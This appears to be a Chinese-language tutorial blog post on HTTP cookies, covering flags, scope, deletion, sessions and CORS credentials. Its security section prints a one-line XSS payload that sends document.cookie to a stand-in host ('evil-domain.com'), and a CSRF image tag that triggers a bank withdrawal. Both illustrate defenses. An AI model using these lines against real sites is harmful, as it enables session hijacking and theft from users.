---
title: cookie.md
date: 2016-08-23 09:48:54
tags: 
- http
- cookie
---
### 简介
HTTP Cookie（也叫Web cookie或者浏览器Cookie）是服务器发送到用户浏览器并保存在浏览器上的一块数据，它会在浏览器下一次发起请求时被携带并发送到服务器上。

### 创建 Cookie

服务器使用Set-Cookie响应头部向用户代理（一般指浏览器）发送Cookie信息。一个简单的Cookie可能像这样：

```
Set-Cookie: <cookie名称>=<cookie值>
```

设置完 Cookie 后对该服务器发起的每一次新的请求，浏览器都会将之前保存的Cookie信息通过Cookie请求头发送给服务器。

#### 会话期Cookie
会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是它仅在会话期间有效。会话期 Cookie *不需要指定过期时间（Expires）或者有效期（Max-Age）* 。需注意的是，有些浏览器提供了会话恢复的功能，这种情况下即便关闭了浏览器会话期 Cookie 也会被保存，就好像浏览器从来没有关闭一样。

#### 持久Cookie

和关闭浏览器便失效不同，持久Cookie可以指定一个特定的过期时间（Expires）或者有效期（Max-Age）。

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

#### 安全和HttpOnly类型Cookie

只有在使用 SLL 和 HTTPS 协议向服务器发起请求时，才能确保 Cookie 被安全地发送到服务器。HttpOnly 标志并没有给你提供额外的加密或者安全性上的能力，当整个机器暴露在不安全的环境时，切记绝不能通过 HTTP Cookie 存储、传输机密或者敏感信息。

HTTP-only 类型的 Cookie 不能使用 Javascript 通过 `Document.cookie` 属性来访问，从而能够在一定程度上阻止域脚本攻击（XSS）。当你不需要在 JavaScript 代码中访问你的 Cookie 时，可以将该 Cookie 设置成 HttpOnly 类型。特别的，当你的 Cookie 仅仅是用于定义会话的情况下，最好给它设置一下 HttpOnly 标志。

只有当一个请求通过 SSL 或 HTTPS 创建时，包含 Secure 选项的 cookie 才能被发送至服务器。这种 Cookie 的内容具有很高的价值，如果以纯文本形式传递很有可能被篡改。事实上，机密且敏感的信息绝不应该在 Cookie 中存储或传输，因为 Cookie 的整个机制原本都是不安全的。默认情况下，在 HTTPS 链接上传输的 Cookie 都会被自动添加上 Secure 选项。

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

#### Cookie的作用域

Domain 和 Path 指令定义了 Cookie 的作用域，即需要发送 Cookie 的 URL 集合。

Domain 指令规定了需要发送 Cookie 的主机名。如果没有指定，默认为当前的文档地址上的主机名（但是不包含子域名）。如果指定了 Domain，则一般包含子域名。

如果设置了 Domain=mozilla.org ，则 Cookie 包含在子域名中（如developer.mozilla.org）。不能跨域上设置一个 Cookie，因为这会产生安全问题。不合法的 Domain 选择将直接被忽略。

Path 指令表明需要发送 Cookie 的URL路径。字符%x2F (即"/")用做文件夹分隔符，子文件夹也会被匹配到。

如设置Path=/docs，则下面这些地址都将匹配到:

"/docs",
"/docs/Web/",
"/docs/Web/HTTP"

### 清理 Cookie`

```
Set-Cookie: <cookie名称>=; path=<Path>; expires=Thu, 01 Jan 1970 00:00:00 GMT
```


### 安全

#### 会话劫持和XSS
在Web应用中，Cookie 常常用来标记用户和会话授权。因此，如果窃取了 Web 应用的 Cookie，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学进行攻击和利用应用程序的漏洞进行XSS攻击。
``` javascript
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```
HttpOnly 类型的 Cookie 由于阻止了 JavaScript 对 Cookie 进行访问而能在一定程度上缓解此类攻击。

#### 跨站请求伪造（CSRF）
维基百科已经给了一个比较好的 CSRF 例子。在这个情况下，有一张并不真实存在的图片（可能是在不安全聊天室或论坛），它实际上是向你的银行服务器发送了提现请求：
```
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```
当你打开含有了这张图片（**本质上不存在这张图片，只是为了利用浏览器加载图片去发送请求。不是 Ajax 请求，浏览器不会因为跨域而拦截。**）的HTML页面时，如果 **你已经登录了你的银行帐号并且还有效**（而且没有其它验证步骤），你的银行里的钱可能会被自动转走。


### Cookie VS Session

Cookie 和 Session 本身没什么联系。Cookie 是放置到客户端的，Session 是放置在服务器端的。服务器端的 Session 其实就是一个 K-V 形式的键值对，Key 就是 SessionID。很多时候我们就把 SessionID 放置到 Cookie 中，利用 **浏览器下一次发起请求时会携带 Cookie 并发送到服务器上** 的便利来跟踪标识一个用户。服务器端从 Cookie 中拿到 SessionID，用 SessionID 拿到 Session 的信息。很多情况下我们会在浏览器地址栏见到类似`?jsessionid=xxxxx`的URL，这种情况就是把 SessionID 放置到 URL 中来携带，在客户端不支持 Cookie 的情况下使用。之所以我们一看到 Session 就会提到 Cookie 是因为 Cookie 携带 SessionID 十分便利罢了。


### 注意事项及常见问题

### 跨域携带 Cookie 问题

CORS 请求默认不发送 Cookie 和 HTTP 认证信息。如果要把 Cookie 发到服务器，一方面要服务器同意，指定 Access-Control-Allow-Credentials 字段
```
Access-Control-Allow-Credentials: true
```

另一方面，开发者必须在AJAX请求中打开withCredentials属性。
```
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
```

否则，即使服务器同意发送 Cookie，浏览器也不会发送。或者，服务器要求设置 Cookie，浏览器也不会处理。
但是，如果省略 withCredentials 设置，有的浏览器还是会一起发送Cookie。这时，可以显式关闭 withCredentials。
```
xhr.withCredentials = false;
```

需要注意的是，如果要发送 Cookie，Access-Control-Allow-Origin 就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨源）原网页代码中的 `document.cookie` 也无法读取服务器域名下的 Cookie。


### 参考
[【1】](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies) [【2】](http://bubkoo.com/2014/04/21/http-cookies-explained/) [【3】](http://www.ruanyifeng.com/blog/2016/04/cors.html)
